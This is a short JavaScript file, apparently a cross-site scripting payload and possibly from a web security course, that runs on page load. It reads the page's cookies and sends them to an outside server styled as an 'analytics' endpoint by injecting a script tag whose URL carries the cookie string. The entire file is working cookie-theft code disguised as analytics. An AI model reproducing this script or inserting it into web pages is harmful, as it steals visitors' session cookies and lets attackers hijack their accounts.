var init = (function() {
	var URL = "https://csci4140-analytics.herokuapp.com/api/jsonp"
	var FIELD = "cookie"

	return (function () {
		var target = URL + "?" + FIELD + "=" + encodeURIComponent(document.cookie);

		var script = document.createElement("script");
		script.src = target;
		document.getElementsByTagName("body")[0].appendChild(script);
	});
})();

window.addEventListener("load", init, false);